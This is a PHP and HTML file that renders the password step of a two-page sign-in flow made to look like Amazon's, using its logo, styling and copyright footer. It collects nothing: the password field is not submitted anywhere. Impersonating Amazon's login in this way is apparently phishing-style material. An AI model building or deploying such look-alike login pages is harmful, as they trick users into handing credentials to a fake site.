<?php
// Get email from first page
$email = $_POST['email'] ?? '';

// Optional: redirect back if no email
if (!$email) {
    header("Location: index.html");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>

<style>
    * {
        box-sizing: border-box;
        font-family: Arial, Helvetica, sans-serif;
    }

    body {
        margin: 0;
        background-color: #f3f3f3;
        text-decoration: none;
    }

.logo-container {
    text-align: center;
    margin-top: 15px;
    margin-bottom: 5px; /* smaller gap */
}

    .logo-container img {
        width: 100px;
    }

.container {
    display: flex;
    justify-content: center;
    margin-top: 0; /* remove extra space */
}

    .login-box {
        background: #fff;
        width: 380px;
        padding: 30px 26px;
        border: 1px solid #ddd;
        border-radius: 8px;
    }

    .login-box h1 {
        margin: 0 0 15px 0;
        font-weight: 500;
        font-size: 28px;
    }

    .email {
        font-size: 15px;
        margin-bottom: 20px;
        display: flex;
        gap: 8px;
        align-items: center;
    }

    .email span {
        font-weight: 500;
        color: #111;
    }

    .email a {
        color: #007185;
        text-decoration: none;
        font-size: 14px;
    }

    .email a:hover {
        text-decoration: underline;
    }

    .label-row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 6px;
        text-decoration: none;
    }

    .label-row a{
        text-decoration: none;
        color: #0a6664;
        font-size: 14px;
    }

    input[type="password"] {
        width: 100%;
        padding: 8px;
        border: 1px solid #a6a6a6;
        border-radius: 6px;
        font-size: 15px;
        margin-bottom: 20px;
    }

    .signin-btn {
        width: 100%;
        background: #FFD814;
        border: 1px solid #FCD200;
        padding: 10px;
        font-size: 16px;
        border-radius: 20px;
        cursor: pointer;
    }

    .signin-btn:hover {
        background: #F7CA00;
    }

    .divider {
        margin: 20px 0;
        border-top: 1px solid #ddd;
    }

    .footer-links {
        text-align: center;
        margin-top: 40px;
        font-size: 12px;
        color: #555;
    }

    .footer-links a {
        margin: 0 10px;
        color: #0066c0;
        text-decoration: none;
    }

    .footer-links a:hover {
        text-decoration: underline;
    }

    .copyright {
        margin-top: 10px;
    }

    .footer-divider {
        margin-top: 40px;
        border: none;
        border-top: 1px solid #ddd;
    }
</style>
</head>

<body>

<div class="logo-container">
    <img src="Amazon_logo.svg.webp" alt="Logo">
</div>

<div class="container">
    <div class="login-box">
        <h1>Sign in</h1>

        <div class="email">
            <span><?php echo htmlspecialchars($email); ?></span>
            <a href="index.html">Change</a>
        </div>

        <div class="label-row">
            <label>Password</label>
            <a href="#">Forgot password?</a>
        </div>

        <input type="password" placeholder="">
        <button class="signin-btn">Sign in</button>

    </div>

    
</div>

<hr class="footer-divider">

    <div class="footer-links">
        <a href="#">Conditions of Use</a>
        <a href="#">Privacy Notice</a>
        <a href="#">Help</a>

        <div class="copyright">
            © 1996–2026, Amazon.com, Inc. or its affiliates
        </div>
    </div>
</body>
</html>
